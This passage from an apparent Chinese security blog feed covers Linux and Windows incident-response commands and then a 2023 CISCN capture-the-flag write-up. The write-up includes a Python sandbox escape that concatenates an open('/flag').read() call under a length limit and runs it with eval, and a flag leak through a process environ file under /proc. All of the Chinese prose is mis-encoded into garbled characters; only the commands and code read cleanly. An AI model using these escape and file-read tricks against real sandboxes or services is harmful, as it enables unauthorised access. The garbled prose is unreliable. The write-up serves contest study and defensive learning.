<p>æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹ï¼ŒæŒ‡å®šå¤©æ•°å†…æ–°å¢çš„æŒ‡å®šç±»å‹æ–‡ä»¶<br><code>find / -ctime 0 -name *.jsp</code></p>
<p><img src="/img/hw/yjxy-14.png"></p>
<p>æ¯”è¾ƒæ–‡ä»¶å·®å¼‚<br><code>diff -c</code></p>
<p><img src="/img/hw/yjxy-15.png"></p>
<p>æŸ¥æ‰¾éšè—è¿›ç¨‹<br><code>ps -ef | awk &#39;&#123;print $2&#125;&#39; |sort -n |uniq &gt; ps.p</code><br><code>ls /proc |sort -n |uniq &gt; proc.p</code><br><code>diff ps.p proc.p</code></p>
<p><img src="/img/hw/yjxy-16.png"></p>
<p>æŸ¥çœ‹ç”¨æˆ·ç™»å½•å†å²è®°å½•<br><code>last</code></p>
<p>æŸ¥çœ‹ç”¨æˆ·ç™»å½•å¤±è´¥è®°å½•<br><code>lastb</code></p>
<p>æŸ¥çœ‹ç”¨æˆ·æœ€è¿‘ä¸€æ¬¡ç™»å½•ä¿¡æ¯<br><code>lastlog</code></p>
<p><img src="/img/hw/yjxy-17.png"></p>
<p>ç™»å½•æˆåŠŸçš„IP<br><code>grep &quot;Accepted&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more</code></p>
<p>å®šä½æœ‰çˆ†ç ´è¡Œä¸ºçš„IP<br><code>grep &quot;Failed&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more</code></p>
<p><img src="/img/hw/yjxy-18.png"></p>
<p>æŸ¥æ‰¾æ¯ä¸ªIPåœ°å€çš„å¤±è´¥ç™»å½•æ¬¡æ•°ï¼š<br><code>awk &#39;/sshd.*Failed/ &#123;print $(NF-3)&#125;&#39; /var/log/secure | sort | uniq -c |sort -nr</code></p>
<p><img src="/img/hw/yjxy-19.png"></p>
<p>æŸ¥æ‰¾ç‰¹å®šIPåœ°å€çš„å¤±è´¥ç™»å½•ï¼š<br><code>grep &quot;sshd.*Failed.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p>
<p><img src="/img/hw/yjxy-20.png"></p>
<p>æŸ¥æ‰¾ç‰¹å®šIPåœ°å€çš„æˆåŠŸç™»å½•ï¼š<br><code>grep &quot;sshd.*Accepted.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p>
<p><img src="/img/hw/yjxy-21.png"></p>
<h2 id="æ—¥å¿—åˆ†æ"><a href="#æ—¥å¿—åˆ†æ" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h2><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">Linuxæ—¥å¿—ç±»å‹å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼Œå†…æ ¸å’Œç³»ç»Ÿæ—¥å¿—ï¼Œç”¨æˆ·æ—¥å¿—ï¼Œåº”ç”¨æ—¥å¿—<br><br>å†…æ ¸å’Œç³»ç»Ÿæ—¥å¿—ï¼šè¿™ç§æ—¥å¿—ä¸»è¦ç”±syslogç®¡ç†ã€æ ¹æ®å…¶é…ç½®æ–‡ä»¶/etc/syslog.confä¸­çš„è®¾ç½®å†³å®šå†…æ ¸æ¶ˆæ¯å’Œå„ç§ç³»ç»Ÿç¨‹åºä¿¡æ¯è®°å½•åˆ°å“ªä¸ªä½ç½®<br>ç”¨æˆ·æ—¥å¿—ï¼šç”¨æˆ·æ—¥å¿—ä¸»è¦è®°å½•ç³»ç»Ÿç”¨æˆ·ç™»å½•æˆ–è€…é€€å‡ºçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·åè´¦å·ã€ç™»å½•æ—¶é—´ã€æºIPç­‰<br>åº”ç”¨æ—¥å¿—ï¼šè®°å½•åº”ç”¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­çš„å„ç§äº‹ä»¶ä¿¡æ¯<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„awkï¼Œfindï¼Œgrepå»åˆ†æå‰é¢æåˆ°çš„å„ç§æ—¥å¿—ï¼ˆå»ºè®®ä½¿ç”¨busyboxï¼Œä»¥é˜²å‘½ä»¤è¢«ç¯¡æ”¹ï¼‰<br>ä¹Ÿå¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„åˆ†æå·¥å…·ï¼Œæ¯”å¦‚LogForensicsï¼Œæ˜Ÿå›¾ç­‰ç­‰</p>
<h2 id="åº”æ€¥å·¥å…·"><a href="#åº”æ€¥å·¥å…·" class="headerlink" title="åº”æ€¥å·¥å…·"></a>åº”æ€¥å·¥å…·</h2><p><strong>busybox</strong></p>
<p>é›†æˆäº†å¾ˆå¤šlinuxå¸¸ç”¨å‘½ä»¤çš„å·¥å…·é›†ï¼Œå½“å‘½ä»¤è¢«åŠ«æŒæˆ–ç¯¡æ”¹æ—¶ä½¿ç”¨</p>
<p>å®˜ç½‘ï¼š<a href="https://busybox.net/">https://busybox.net/</a></p>
<p><img src="/img/hw/yjxy-22.png"></p>
<p><strong>unhide</strong></p>
<p>æ£€æµ‹å‘ç°å€ŸåŠ©rootkitåŠå…¶ä»–æŠ€æœ¯éšè—çš„è¿›ç¨‹å’ŒTCP&#x2F;UDPç«¯å£çš„å‘½ä»¤è¡Œå·¥å…·</p>
<p><code>yum -y install unhide</code>å®‰è£…æˆ–è€…åœ¨<a href="https://www.unhide-forensics.info/">å®˜ç½‘ä¸‹è½½</a></p>
<p><img src="/img/hw/yjxy-23.png"></p>
<p><strong>chkrootkit</strong></p>
<p>linuxä¸‹æ£€æµ‹rootkitçš„è„šæœ¬</p>
<p>ubuntuç³»åˆ—å®‰è£…å‘½ä»¤ï¼š<code>apt install chkrootkit</code><br>centosç³»åˆ—ï¼šç”±äºchkrootkitæ²¡æœ‰åŒ…å«åœ¨å®˜æ–¹çš„Centosæºä¸­ï¼Œå› æ­¤è¦é‡‡å–æ‰‹åŠ¨ç¼–è¯‘çš„æ–¹æ³•æ¥å®‰è£…ï¼Œ<a href="https://www.chkrootkit.org/">å®˜ç½‘</a></p>
<p>ç›´æ¥è¿è¡ŒåæŸ¥æ‰¾infectedå…³é”®å­—å³å¯</p>
<p><img src="/img/hw/yjxy-24.png"></p>
<p><strong>clamav</strong></p>
<p>æ£€æµ‹æœ¨é©¬ã€ç—…æ¯’ã€æ¶æ„è½¯ä»¶å’Œå…¶ä»–æ¶æ„å¨èƒçš„å¼€æºé˜²ç—…æ¯’å¼•æ“</p>
<p><img src="/img/hw/yjxy-25.png"></p>
<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="å¸¸ç”¨å‘½ä»¤-1"><a href="#å¸¸ç”¨å‘½ä»¤-1" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>regedit</td>
<td>æ³¨å†Œè¡¨</td>
</tr>
<tr>
<td>taskmgr</td>
<td>ä»»åŠ¡ç®¡ç†å™¨</td>
</tr>
<tr>
<td>msconfig</td>
<td>ç³»ç»Ÿé…ç½®</td>
</tr>
<tr>
<td>eventvwr</td>
<td>äº‹ä»¶æŸ¥çœ‹å™¨</td>
</tr>
<tr>
<td>compmgmt.msc</td>
<td>è®¡ç®—æœºç®¡ç†</td>
</tr>
<tr>
<td>gpedit.msc</td>
<td>æœ¬åœ°ç»„ç­–ç•¥</td>
</tr>
<tr>
<td>taskschd.msc</td>
<td>è®¡åˆ’ä»»åŠ¡</td>
</tr>
<tr>
<td>lusrmgr.msc</td>
<td>æœ¬åœ°ç”¨æˆ·å’Œç»„</td>
</tr>
</tbody></table>
<p>æŸ¥çœ‹ç½‘ç»œè¿æ¥<br><code>netstat -ano</code></p>
<p>æ“ä½œç³»ç»Ÿçš„è¯¦ç»†é…ç½®ä¿¡æ¯<br><code>systeminfo</code></p>
<p>è·å–ç³»ç»Ÿè¿›ç¨‹ä¿¡æ¯<br><code>wmic process</code></p>
<p>æ ¹æ®åº”ç”¨ç¨‹åºæŸ¥æ‰¾PID<br><code>wmic process where name=&quot;cmd.exe&quot; get processid,executablepath,name</code></p>
<p>æ ¹æ®PIDæŸ¥æ‰¾åº”ç”¨ç¨‹åº<br><code>wmic process where processid=&quot;9096&quot; get executablepath,name</code></p>
<p>è·å–ç³»ç»Ÿè¿›ç¨‹ä¿¡æ¯<br><code>tasklist</code></p>
<p>å¯¹äºè¦æŸ¥è¯¢ç‰¹å®šdllçš„è°ƒç”¨æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨<br><code>tasklist /d dllåç§°</code></p>
<p>è®¡ç®—æ ·æœ¬MD5<br><code>certutil -hashfile %æ ·æœ¬exe% md5</code></p>
]]></content>
      <categories>
        <category>hw</category>
      </categories>
      <tags>
        <tag>hw</tag>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title>2023ciscnåˆèµ›wp</title>
    <url>/posts/8bd8be28/</url>
    <content><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ç­¾åˆ°å¡"><a href="#ç­¾åˆ°å¡" class="headerlink" title="ç­¾åˆ°å¡"></a>ç­¾åˆ°å¡</h2><p><code>print(open(&#39;/flag&#39;).read())</code></p>
<p><img src="/img/wp/2023/2023ciscn-1.png"></p>
<h2 id="è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡"><a href="#è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡" class="headerlink" title="è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡"></a>è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡</h2><p>è¿½è¸ªtcpæµï¼Œæ•°æ®æå–å‡ºæ¥base32</p>
<p><img src="/img/wp/2023/2023ciscn-2.png"></p>
<p><img src="/img/wp/2023/2023ciscn-3.png"></p>
<h2 id="å›½ç²¹"><a href="#å›½ç²¹" class="headerlink" title="å›½ç²¹"></a>å›½ç²¹</h2><p>å…ˆåˆ†å‰²<code>é¢˜ç›®.png</code>ä¸­çš„å°éº»å°†åˆ°<code>output</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>w=<span class="hljs-number">0</span><br>h=<span class="hljs-number">0</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;é¢˜ç›®.png&#x27;</span>)<br><br>w1,h1=a.size<br><span class="hljs-keyword">while</span> w&lt;w1:<br>    im=a.crop((w,h,w+<span class="hljs-number">53</span>,h+<span class="hljs-number">73</span>))<br>    im.save(os.path.join(<span class="hljs-string">&#x27;output&#x27;</span>,<span class="hljs-built_in">str</span>(w))+<span class="hljs-string">&#x27;.png&#x27;</span>)<br>    w+=<span class="hljs-number">53</span><br><br></code></pre></td></tr></table></figure>

<p>å†å°†<code>a.png</code>å’Œ<code>k.png</code>ä¸­çš„å°éº»å°†å»<code>output</code>æ‰¾å¯¹åº”çš„ç´¢å¼•å€¼ï¼Œåˆ†åˆ«ä½œä¸ºçºµåæ ‡å’Œæ¨ªåæ ‡ç”»å›¾å¾—åˆ°<code>flag</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a=cv2.imread(<span class="hljs-string">&quot;a.png&quot;</span>)<br>k=cv2.imread(<span class="hljs-string">&quot;k.png&quot;</span>)<br>w=<span class="hljs-built_in">len</span>(a[<span class="hljs-number">0</span>])<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">import</span> os<br>path=<span class="hljs-string">&#x27;output/&#x27;</span><br>d=os.listdir(path)<br>d.remove(<span class="hljs-string">&quot;0.png&quot;</span>)<br>data=[[],[]]<br>Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">im1,im2,sind</span>):<br>    A=cv2.absdiff(im1,im2)<br>    <span class="hljs-keyword">if</span> np.count_nonzero(A) ==<span class="hljs-number">0</span> :<br>        Status[sind]=<span class="hljs-literal">True</span><br>        ind=<span class="hljs-built_in">int</span>(j.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> ind!=<span class="hljs-number">0</span>:<br>            data[sind].append(ind//<span class="hljs-number">53</span>)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">while</span> i&lt;w:<br>    ima=a[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    imk=k[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> d:<br>        im2=cv2.imread(os.path.join(path,j))<br>        check(ima,im2,<span class="hljs-number">0</span>)<br>        check(imk,im2,<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> Status==[<span class="hljs-literal">True</span>,<span class="hljs-literal">True</span>]:<br>            <span class="hljs-keyword">break</span><br>    i+=<span class="hljs-number">53</span><br><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">42</span>,<span class="hljs-number">42</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w//<span class="hljs-number">53</span>):<br>    a.putpixel((data[<span class="hljs-number">1</span>][i],data[<span class="hljs-number">0</span>][i]),<span class="hljs-number">255</span>)<br>a.save(<span class="hljs-string">&#x27;123.png&#x27;</span>)<br>a.show()<br></code></pre></td></tr></table></figure>

<h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2><p>python æ²™ç›’</p>
<p>åˆ©ç”¨<code>_</code>æ‹¼æ¥å­—ç¬¦ä¸²å<code>eval</code>æ‰§è¡Œï¼ŒåŒæ—¶é™åˆ¶äº†7ä½å­—ç¬¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">Welcome to this python shell,<span class="hljs-keyword">try</span> to find the flag!<br>&gt;&gt;<span class="hljs-string">&#x27;open&#x27;</span><br><span class="hljs-string">&#x27;open&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;(&quot;/&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;fl&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/fl&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;ag&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;&quot;)&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;)&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;.&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;rea&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).rea&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;d()&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).read()&#x27;</span><br><br>&gt;&gt;<span class="hljs-built_in">eval</span>(_)<br><span class="hljs-string">&#x27;flag&#123;b8c3ead1-cdad-4ddb-bb81-9486888d426a&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>æ‰“å¼€åæœ‰å¾ˆå¤šå®½åº¦ä¸ä¸€æ ·çš„å°<code>bmp</code>æ–‡ä»¶ï¼Œæ”¾è¿›010é‡Œåˆ†æå‘ç°åœ¨å†—ä½™ä½å¤šäº†ä¸€äº›æ•°æ®</p>
<p>ä»¥<code>bfReserved1</code>è¡¨ç¤ºå›¾ç‰‡å·¦ä¸Šè§’<code>x</code>åæ ‡ï¼Œ<code>bfReserved2</code>è¡¨ç¤ºå›¾ç‰‡å·¦ä¸Šè§’<code>y</code>åæ ‡ï¼Œ<code>biXPelsPerMeter</code>è¡¨ç¤ºå›¾ç‰‡å³ä¸‹è§’<code>x</code>åæ ‡ï¼Œ<code>biYPelsPerMeter</code>è¡¨ç¤ºå›¾ç‰‡å³ä¸‹è§’<code>y</code>åæ ‡ç”»å›¾</p>
<p><img src="/img/wp/2023/2023ciscn-4.png"></p>
<p><img src="/img/wp/2023/2023ciscn-5.png"></p>
<p>ç”»çš„æ—¶å€™æ³¨æ„<code>biHeight</code>ï¼Œåœ¨<code>bmp</code>ä¸­è¯¥å€¼æ˜¯æ­£æ•°è¯´æ˜å›¾åƒæ˜¯å€’å‘çš„å³å›¾åƒå­˜å‚¨æ˜¯ç”±ä¸‹åˆ°ä¸Šï¼›è¯¥å€¼æ˜¯è´Ÿæ•°è¯´æ˜å›¾åƒæ˜¯å€’å‘çš„å³å›¾åƒå­˜å‚¨æ˜¯ç”±ä¸Šåˆ°ä¸‹ï¼Œæ‰€ä»¥é‡åˆ°è´Ÿæ•°çš„å›¾ç‰‡éœ€è¦åè½¬ä¸€ä¸‹åœ¨æ‹¼å›¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">7200</span>,<span class="hljs-number">4000</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    pic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>)<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">38</span>:<span class="hljs-number">42</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">42</span>:<span class="hljs-number">46</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    If_rev = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-keyword">if</span>(If_rev != <span class="hljs-number">100</span>):<br>        pic = pic.transpose(Image.FLIP_TOP_BOTTOM)<br>    img.paste(pic,(Res1,Res2,Xpel,Ypel))<br>img.save(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>æ‹¼å®Œåçš„å›¾è·‘<code>zsteg</code>ï¼Œå¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†çš„flagï¼š<code>flag&#123;f1R5T_part_1s_LSB_sTeG0_</code></p>
<p><img src="/img/wp/2023/2023ciscn-6.png"></p>
<p>ç„¶åè¿˜æ˜¯<code>biHeight</code>ï¼Œé«˜åº¦-100çš„åš0ï¼Œ100çš„åš1ï¼Œbinaryä¹‹åå¾—åˆ°ç¬¬äºŒéƒ¨åˆ†flagï¼š<code>2nd_paRT_15_reVeRSe_bMp_</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br>Res1_L,Res2_L,Ypel_L,XY_L = [],[],[],[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res1_L.append(Res1)<br>    Res2_L.append(Res2)<br>    Ypel_L.append(Ypel)<br>    XY_L.append((Res2,Res1))<br>a = <span class="hljs-built_in">sorted</span>(Res1_L)<br>b = <span class="hljs-built_in">sorted</span>(Res2_L)<br>c = <span class="hljs-built_in">sorted</span>(XY_L)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    ind = XY_L.index(c[i])<br>    <span class="hljs-keyword">if</span>(Ypel_L[ind] == <span class="hljs-number">4294967196</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;0&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023ciscn-7.png"></p>
<p>ç¬¬ä¸‰éƒ¨åˆ†åœ¨è¡¥é½å­—èŠ‚çš„æ•°æ®ä¸­<br>æ‰¾åˆ°ç¬¬ä¸€å¼ å›¾ç‰‡<code>17447199634.bmp</code>ï¼ŒæŸ¥çœ‹è¡¥é½å­—èŠ‚çš„æ•°æ®</p>
<p>å‘ç°ä¾æ¬¡æ˜¯<code>FF D8</code>ï¼Œ<code>FF E1</code>ç­‰</p>
<p><img src="/img/wp/2023/2023ciscn-8.png"></p>
<p>æ‰€ä»¥å¯ä»¥ä»¥<code>padding</code>æ•°æ®æŒ‰ç…§å·¦ä¸Šåˆ°å³ä¸‹çš„é¡ºåºæ‹¼æ¥å¾—åˆ°<code>jpg</code>å›¾ç‰‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br>Xpel_L,XY_L,Leng_L,Ypel_L,f_list = [],[],[],[],[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">18</span>:<span class="hljs-number">22</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel_L.append(Xpel)<br>    XY_L.append((Res2,Res1))<br>    Leng_L.append((<span class="hljs-built_in">len</span>(f)-<span class="hljs-number">54</span>))<br>    Ypel_L.append(Ypel)<br>c = <span class="hljs-built_in">sorted</span>(XY_L)<br><br>Padding_file = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    ind = XY_L.index(c[i])<br>    <span class="hljs-keyword">if</span>(Leng_L[ind] != Xpel_L[ind]*<span class="hljs-number">300</span>):<br>        Padding_file.append(ind)<br><br>data = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(Padding_file)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[Padding_file[i]]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    w = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">18</span>:<span class="hljs-number">22</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    f = f[<span class="hljs-number">54</span>:]<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(f)-w*<span class="hljs-number">100</span>*<span class="hljs-number">3</span> == <span class="hljs-number">100</span>):<br>        pad = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(<span class="hljs-built_in">len</span>(f)-w*<span class="hljs-number">100</span>*<span class="hljs-number">3</span> == <span class="hljs-number">200</span>):<br>        pad = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">else</span>:<br>        pad = <span class="hljs-number">3</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        d = f[j*(w*<span class="hljs-number">3</span>+pad):j*(w*<span class="hljs-number">3</span>+pad)+w*<span class="hljs-number">3</span>+pad]<br>        data += d[-pad:]<br>fw = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.jpg&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°ç¬¬ä¸‰éƒ¨åˆ†çš„flagï¼š<code>3rd_parT_1s_paddINGINGING</code></p>
<p><img src="/img/wp/2023/2023ciscn-9.jpg"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="åŸºäºå›½å¯†SM2ç®—æ³•çš„å¯†é’¥å¯†æ–‡åˆ†å‘"><a href="#åŸºäºå›½å¯†SM2ç®—æ³•çš„å¯†é’¥å¯†æ–‡åˆ†å‘" class="headerlink" title="åŸºäºå›½å¯†SM2ç®—æ³•çš„å¯†é’¥å¯†æ–‡åˆ†å‘"></a>åŸºäºå›½å¯†SM2ç®—æ³•çš„å¯†é’¥å¯†æ–‡åˆ†å‘</h2><p>æ ¹æ®æ–‡æ¡£ä¸€æ­¥ä¸€æ­¥æ¥å³å¯ï¼Œè™½ç„¶æœ‰ç‚¹æ²¡çœ‹æ‡‚</p>
<p>å…ˆæ‰¾ä¸ªç½‘å€ç”Ÿæˆä¸€ç»„å…¬é’¥å’Œå¯†é’¥ <a href="https://www.lzltool.com/SM2">https://www.lzltool.com/SM2</a></p>
<p>ç™»å½•æ‹¿id</p>
<p><img src="/img/wp/2023/2023ciscn-10.png"></p>
<p>ä¸Šä¼ å…¬é’¥</p>
<p><img src="/img/wp/2023/2023ciscn-11.png"></p>
<p>è®¿é—®<code>/api/quantum</code>è·å–å¯†é’¥å¯†æ–‡</p>
<p>è®¿é—®<code>/api/check</code>å‘é€<code>quantumString</code>çš„å€¼</p>
<p>ä½¿<code>quantumStringUser</code>çš„å€¼ç­‰äº<code>quantumStringServer</code>çš„å€¼å³å¯é€šè¿‡éªŒè¯</p>
<p>è®¿é—®<code>/api/search</code>å¾—åˆ°flag</p>
<p><img src="/img/wp/2023/2023ciscn-12.png"></p>
<h2 id="å¯ä¿¡åº¦é‡"><a href="#å¯ä¿¡åº¦é‡" class="headerlink" title="å¯ä¿¡åº¦é‡"></a>å¯ä¿¡åº¦é‡</h2><p>éé¢„æœŸ</p>
<p><code>/proc/22/task/22/environ</code>å¯ä»¥ç›´æ¥çœ‹åˆ°flag</p>
<p><img src="/img/wp/2023/2023ciscn-13.png"></p>
<h2 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h2><p>base64æ¢è¡¨</p>
